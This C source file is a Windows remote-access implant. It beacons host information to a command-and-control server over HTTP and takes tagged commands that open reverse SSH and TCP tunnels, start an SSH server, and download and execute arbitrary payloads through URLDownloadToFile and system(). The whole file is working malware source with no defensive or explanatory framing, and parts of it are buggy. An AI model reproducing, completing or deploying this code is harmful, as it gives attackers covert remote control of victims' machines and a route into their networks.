#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <libssh/libssh.h>
#include <windows.h>
#include <pthread.h>
#include <urlmon.h>
#include "ssh_server_impl.h"
#include "ssh_client_impl.h"
#include "helpers.h"
#include "socks5_proxy.h"
#include <tchar.h>
#include <wininet.h>
#include <malloc.h>


#define USER "c2_user"
#define PASSWORD "do_not_commit_real_password"
const int REMOTE_SSH_PORT = 22;
int UPDATE_INTERVAL = 10000;


pthread_mutex_t SSH_SERVER_THREAD_HANDLE_MTX = PTHREAD_MUTEX_INITIALIZER;
volatile HANDLE SSH_SERVER_THREAD_HANDLE = NULL;

pthread_mutex_t SSH_TUNNEL_THREAD_HANDLE_MTX = PTHREAD_MUTEX_INITIALIZER;
volatile HANDLE SSH_TUNNEL_THREAD_HANDLE = NULL;

pthread_mutex_t TCP_TUNNEL_THREAD_HANDLE_MTX = PTHREAD_MUTEX_INITIALIZER;
volatile HANDLE TCP_TUNNEL_THREAD_HANDLE = NULL;

pthread_mutex_t DYNAMIC_TUNNEL_THREAD_HANDLE_MTX = PTHREAD_MUTEX_INITIALIZER;
volatile HANDLE DYNAMIC_TUNNEL_THREAD_HANDLE = NULL;

pthread_mutex_t SOCKS5_SERVER_THREAD_HANDLE_MTX = PTHREAD_MUTEX_INITIALIZER;
volatile HANDLE SOCKS5_SERVER_THREAD_HANDLE = NULL;

struct command {
    char* name;
    char* parameter;
    void *next;
};

struct tunnel_params {
    char* target_ip;
    int local_port;
    int remote_port;
    char running;
};

int parse_item(char* buffer, char* cmd_start_format, char* cmd_end_format, int cmd_nr, char *item_name) {
    int cmd_start_index = -1;
    int cmd_end_index = -1;
    int cmd_start_format_len = strlen(cmd_start_format);
    int cmd_end_format_len = strlen(cmd_end_format);

    char* cmd_start = malloc(cmd_start_format_len+1);
    if (cmd_start == 0) {
        return -1;
    }
    int cmd_start_len = sprintf_s(cmd_start, cmd_start_format_len, cmd_start_format, cmd_nr);
    
    char *cmd_end = malloc(cmd_end_format_len +1);

    if (cmd_end == 0) {
        return -1;
    }

    int cmd_end_len = sprintf_s(cmd_end, cmd_end_format_len, cmd_end_format, cmd_nr);

    for (int i = 0; i < 2048; i++) {
        if (memcmp(buffer + i, cmd_start, cmd_start_len) == 0) {
            cmd_start_index = i;
        }

        if (memcmp(buffer + i, cmd_end, cmd_end_len) == 0) {
            cmd_end_index = i;
        }
    }

    if (cmd_start_index > -1 && cmd_end_index > -1) {
        int cmd_len = cmd_end_index - cmd_start_index - cmd_start_len;
        memcpy(item_name, buffer + cmd_start_index + cmd_start_len, cmd_len);
        *(item_name + cmd_len) = 0;
        return 0;
    }

    return -1;
}

int parse_cmd_name(char* buffer, int cmd_nr, char* cmd_name) {
    return parse_item(buffer, "<Command%d>", "</Command%d>", cmd_nr, cmd_name);
}

int parse_cmd_param(char* buffer, int cmd_nr, char* cmd_param_name) {
    return parse_item(buffer, "<Command%dParam>", "</Command%dParam>", cmd_nr, cmd_param_name);
}

int parse_cmd(char* buffer, struct command *cmd) {
    
    if (cmd == NULL) {
        return -1;
    }
    cmd->next = NULL;
    struct command* prev = NULL;
    for (int i = 1; i < 9; i++) {
        char* cmd_name = malloc(50);

        if (cmd_name == NULL) {
            return -1;
        }
        if (parse_cmd_name(buffer, i, cmd_name) == -1) {
           
            if (i == 1) {
                return -1; //no command could be found at all
            }
            free(cmd_name);
            return 0;
        }
        
        if (prev == NULL) {
            cmd->name = cmd_name;
            prev = cmd;
        }
        else {
            struct command *tmp = malloc(sizeof(struct command));
            
            if (tmp == NULL) {
                return -1;
            }

            tmp->name = cmd_name;
            tmp->next = NULL;
            prev->next = tmp;
            prev = tmp;
        }

        char* cmd_param = malloc(50);

        if (cmd_param == NULL) {
            return -1;
        }

        if (parse_cmd_param(buffer, i, cmd_param) == -1) {
            free(cmd_param);
        } 
        else {
            prev->parameter = cmd_param;
        }
    }
}

int receive(int socket, char* buff, int length) {
    int read_length = 0;
    do {
        char tmp_buf[200];
        int tmp_len = recv(socket, tmp_buf, 200, 0);

        if (tmp_len <= 0) {
            break;
        }

        memcpy(buff + read_length, tmp_buf, tmp_len);
        read_length += tmp_len;
    } while (read_length < length);

    return read_length;
}

int send_http_request(char* buffer, char* c2_server_ip) {

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 0), &wsa) != 0) {
        return 0;
    }

    int read_length;
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(8080);
    server_address.sin_addr.s_addr = inet_addr(c2_server_ip);

    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 0;
    }

    if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) != 0) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    char* pc_info_buffer = malloc(1024);
    
    if (pc_info_buffer == NULL) {
        return 0;
    }
    
    memset(pc_info_buffer, 0, 1024);

    get_pc_infos(UPDATE_INTERVAL, pc_info_buffer);

    int pc_infos_len = strlen(pc_info_buffer);

    int pc_infos_len_size = 0;

    while (pc_infos_len > 0) {
        pc_infos_len_size++;
        pc_infos_len = pc_infos_len / 10;
    }

    char* header_template = "POST /info.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n%s";
    
    int header_size = strlen(header_template) - 4 + strlen(pc_info_buffer) + pc_infos_len_size;
    char* header = malloc(strlen(header_template) - 4 + strlen(pc_info_buffer) + pc_infos_len_size);

    snprintf(header, header_size+1, header_template, strlen(pc_info_buffer), pc_info_buffer);

    int sent = send(sock, header, header_size, 0);

    if (sent < 0) {
        read_length = -1;
        goto CLEANUP;
    }
    
    read_length = receive(sock, buffer, 2048);

    if (memcmp(buffer, "HTTP/1.0 200 OK\r\n", 17) != 0) {
        read_length = -1;
        goto CLEANUP;
    }

CLEANUP:
    closesocket(sock);
    WSACleanup();
    return read_length;
}

void forward_tunnel(ssh_channel channel, struct tunnel_params* tunnel_params) {
    int forward_socket = -1;
    fd_set fds;
    struct sockaddr_in addr;
    int result, read_length, tmp, write_length;
    struct timeval timeout;
    char* buffer = (char*)malloc(16384);

    if (buffer == NULL) {
        return;
    }

    forward_socket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (forward_socket == -1) {
        return;
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(tunnel_params->local_port);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (connect(forward_socket, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        goto CLOSE_SOCKET;
    }

    while (tunnel_params->running) {
        FD_ZERO(&fds);
        FD_SET(forward_socket, &fds);

        timeout.tv_sec = 0;
        timeout.tv_usec = 100000;

        result = select(forward_socket + 1, &fds, NULL, NULL, &timeout);

        if (result == -1) {
            goto CLOSE_SOCKET;
        }

        if (!result || !FD_ISSET(forward_socket, &fds)) {
            goto READ_CHANNEL;
        }

        read_length = recv(forward_socket, buffer, sizeof(buffer), 0);

        if (read_length < 0) {
            goto CLOSE_SOCKET;
        }

        write_length = 0;
        while (write_length != read_length) {
            tmp = ssh_channel_write(channel, buffer, read_length);
            if (tmp < 0) {
                goto CLOSE_SOCKET;
            }
            write_length += tmp;
        }
    READ_CHANNEL:

        while (tunnel_params->running) {

            read_length = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer), 0);

            if (read_length == 0) {
                break;
            }

            if (read_length == SSH_ERROR || read_length == SSH_EOF) {
                goto CLOSE_SOCKET;
            }

            write_length = 0;
            while (read_length != write_length) {
                tmp = send(forward_socket, buffer + write_length, read_length - write_length, 0);
                write_length += tmp;
            }
        }
    }
    free(buffer);
CLOSE_SOCKET:
    closesocket(forward_socket);
}

DWORD WINAPI open_ssh_tunnel(LPVOID params) {
    int result;
    int retries;
    ssh_channel channel;
    ssh_session session = NULL;

    struct tunnel_params* tunnel_params = (struct tunnel_params*)params;
    retries = 0;
    while (session == NULL && retries < 3) {
        Sleep(5000);
        session = connect_to_ssh_server(tunnel_params->target_ip, REMOTE_SSH_PORT, "remote_admin_ssh");
    }

    if (session == NULL) {
        goto NULL_HANDLE;
    }

    result = ssh_channel_listen_forward(session, (char*)tunnel_params->target_ip, tunnel_params->remote_port, NULL);

    if (result != SSH_OK) {
        goto DISCONNECT;
    }

    channel = channel_forward_accept(session, 60000);

    if (channel == NULL) {
        goto DISCONNECT;
    }

    forward_tunnel(channel, tunnel_params);
    ssh_channel_send_eof(channel);
    ssh_channel_free(channel);
DISCONNECT:
    ssh_disconnect(session);
    ssh_free(session);
    session = NULL;
NULL_HANDLE:
    pthread_mutex_lock(&SSH_TUNNEL_THREAD_HANDLE_MTX);
    SSH_TUNNEL_THREAD_HANDLE = NULL;
    pthread_mutex_unlock(&SSH_TUNNEL_THREAD_HANDLE_MTX);
}

void open_tunnel(LPVOID params) {
    int result;
    struct tunnel_params *tunnel_params = (struct tunnel_params*)params;

    ssh_session session = connect_to_ssh_server(tunnel_params->target_ip, REMOTE_SSH_PORT, "remote_admin_ssh");
    
    if (session == NULL) {
        goto NULL_HANDLE;
    }

    result = ssh_channel_listen_forward(session, NULL, tunnel_params->remote_port, NULL);

    if (result != SSH_OK) {
        goto DISCONNECT;
    }

    ssh_channel channel = ssh_forward_accept(session, 10000);

    if (channel == NULL) {
        goto DISCONNECT;
    }

    forward_tunnel(channel, tunnel_params);

    ssh_channel_send_eof(channel);
    ssh_channel_free(channel);
DISCONNECT:
    ssh_disconnect(session);
    ssh_free(session);
    session = NULL;
NULL_HANDLE:
    pthread_mutex_lock(&TCP_TUNNEL_THREAD_HANDLE_MTX);
    TCP_TUNNEL_THREAD_HANDLE = NULL;
    pthread_mutex_unlock(&TCP_TUNNEL_THREAD_HANDLE_MTX);
}

DWORD WINAPI open_tcp_tunnel(LPVOID params) {
    
    open_tunnel(params);
    
    pthread_mutex_lock(&TCP_TUNNEL_THREAD_HANDLE_MTX);
    TCP_TUNNEL_THREAD_HANDLE = NULL;
    pthread_mutex_unlock(&TCP_TUNNEL_THREAD_HANDLE_MTX);
}

DWORD WINAPI open_dynamic_tunnel(LPVOID params) {
    
    open_tunnel(params);

    pthread_mutex_lock(&DYNAMIC_TUNNEL_THREAD_HANDLE_MTX);
    DYNAMIC_TUNNEL_THREAD_HANDLE = NULL;
    pthread_mutex_unlock(&DYNAMIC_TUNNEL_THREAD_HANDLE_MTX);
}

DWORD WINAPI call_home_thread_func(LPVOID c2_server_ip)
{
    struct ssh_server_options srv_options = {
        .running = 1
    };

    struct tunnel_params ssh_tunnel_params = {
        .running = 1,
        .target_ip = c2_server_ip
    };

    struct tunnel_params tcp_tunnel_params = {
        .running = 1,
        .target_ip = c2_server_ip
    };

    struct tunnel_params dynamic_tunnel_params = {
        .running = 1,
        .target_ip = c2_server_ip
    };

    // struct socks5_proxy_param socks5_proxy_params = {
    //     .running = 1
    // };
    
    char cmd_buffer[2048];
    while (1) {
        
        memset(&cmd_buffer, 0, 2048);
        int cmd_buffer_length = send_http_request(cmd_buffer, (char*)c2_server_ip);

        if (cmd_buffer_length <= 0) {
            goto SLEEP;
        }

        struct command* cmd = malloc(sizeof(struct command));
        if (cmd == NULL) {
            break;
        }

        if (parse_cmd(cmd_buffer, cmd) == -1) {
            goto SLEEP;
        }


        struct command *curr = cmd;

        while (curr != NULL) {
            if (strcmp(curr->name, "OpenSSHTunnel") == 0) {
                pthread_mutex_lock(&SSH_TUNNEL_THREAD_HANDLE_MTX);

                if (SSH_TUNNEL_THREAD_HANDLE == NULL) {
                    ssh_tunnel_params.local_port = extractValue(curr->parameter, (const char*)'L');
                    ssh_tunnel_params.remote_port = extractValue(curr->parameter, (const char*)'R');
                    SSH_TUNNEL_THREAD_HANDLE = start_thread(open_ssh_tunnel, &ssh_tunnel_params);
                }

                pthread_mutex_unlock(&SSH_TUNNEL_THREAD_HANDLE_MTX);

                if (SSH_SERVER_THREAD_HANDLE == NULL) {
                    srv_options.local_port = extractValue(curr->parameter, (const char*)'L');
                    SSH_SERVER_THREAD_HANDLE = start_thread(start_ssh_server, &srv_options);
                }
            }
            else if (strcmp(curr->name, "CloseSSHTunnel") == 0) {
                srv_options.running = 0;
                ssh_tunnel_params.running = 0;

            }
            else if (strcmp(curr->name, "OpenTCPTunnel") == 0) {

                pthread_mutex_lock(&TCP_TUNNEL_THREAD_HANDLE_MTX);

                if (TCP_TUNNEL_THREAD_HANDLE == NULL) {
                    tcp_tunnel_params.local_port = extractValue(curr->parameter, (const char*)'L');
                    tcp_tunnel_params.remote_port = extractValue(curr->parameter, (const char*)'R');

                    TCP_TUNNEL_THREAD_HANDLE = start_thread(open_tcp_tunnel, &tcp_tunnel_params);
                }

                pthread_mutex_unlock(&TCP_TUNNEL_THREAD_HANDLE_MTX);
            }
            else if (strcmp(curr->name, "CloseTCPTunnel") == 0) {
                tcp_tunnel_params.running = 0;
            }
            // else if (strcmp(curr->name, "OpenDynamicTunnel") == 0) {
                
            //     pthread_mutex_lock(&SOCKS5_SERVER_THREAD_HANDLE_MTX);

            //     if (SOCKS5_SERVER_THREAD_HANDLE == NULL) {
            //         struct socks5_proxy_param param = {
            //             .local_port = extractValue(curr->parameter, 'L')
            //         };

            //         SOCKS5_SERVER_THREAD_HANDLE = start_thread(start_socks5_proxy, &param);
            //     }
               
            //     pthread_mutex_unlock(&SOCKS5_SERVER_THREAD_HANDLE_MTX);

            //     pthread_mutex_lock(&DYNAMIC_TUNNEL_THREAD_HANDLE_MTX);

            //     if (TCP_TUNNEL_THREAD_HANDLE == NULL) {
                   
            //         dynamic_tunnel_params.local_port = extractValue(curr->parameter, 'L');
            //         dynamic_tunnel_params.remote_port = extractValue(curr->parameter, 'R');

            //         DYNAMIC_TUNNEL_THREAD_HANDLE = start_thread(open_dynamic_tunnel, &dynamic_tunnel_params);
            //     }

            //     pthread_mutex_unlock(&DYNAMIC_TUNNEL_THREAD_HANDLE_MTX);
            // }
            // else if (strcmp(curr->name, "CloseDynamicTunnel") == 0) {
            //     dynamic_tunnel_params.running = 0;
            //     socks5_proxy_params.running = 0;
            // }
            else if (strcmp(curr->name, "Task") == 0) {

                const size_t param_length = strlen(curr->parameter) +1;
                wchar_t *wide_param = malloc(param_length * sizeof(wchar_t));
                size_t converted_length;
                mbstowcs_s(&converted_length, wide_param, param_length, curr->parameter, param_length);
                if (wide_param != NULL) {
                    DeleteUrlCacheEntry((LPCSTR)wide_param);
                    HRESULT result = URLDownloadToFile(NULL, (LPCSTR)wide_param, (LPCSTR)"C:\\tmp\\temp", 0, NULL);
                    free(wide_param);
                    system("C:\\tmp\\temp");
                }

            }

            curr = curr->next;
        }
SLEEP:
		Sleep(UPDATE_INTERVAL);
	}
}
int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
	
    //init lib ssh
    ssh_init();
    char* c2_server_ip = (char*)lpCmdLine;
    
	//start connecting
	DWORD thread_id;
	HANDLE handle = start_thread(call_home_thread_func, c2_server_ip);
	
	//wait for call_home thread to finish
	WaitForSingleObject(handle, INFINITE);
}

